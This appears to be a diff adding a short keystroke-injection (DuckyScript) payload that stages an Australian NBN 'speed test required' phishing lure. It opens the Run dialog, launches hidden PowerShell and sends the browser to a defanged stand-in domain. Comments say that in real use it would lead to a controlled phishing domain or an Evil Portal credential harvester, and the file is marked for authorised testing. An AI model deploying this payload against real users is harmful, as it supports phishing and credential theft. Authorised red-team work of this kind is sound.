@@ -1,0 +1,11 @@
+REM NBN "Outage - Speed Test Required" Lure (Australian)
+REM FOR AUTHORISED TESTING ONLY
+
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden -Command "Start-Process 'https://fake-nbn-speedtest[.]example[.]com'"
+ENTER
+
+REM In real use this would point to a controlled phishing domain
+REM or local Evil Portal + credential harvester.
+REM This is demonstration only.
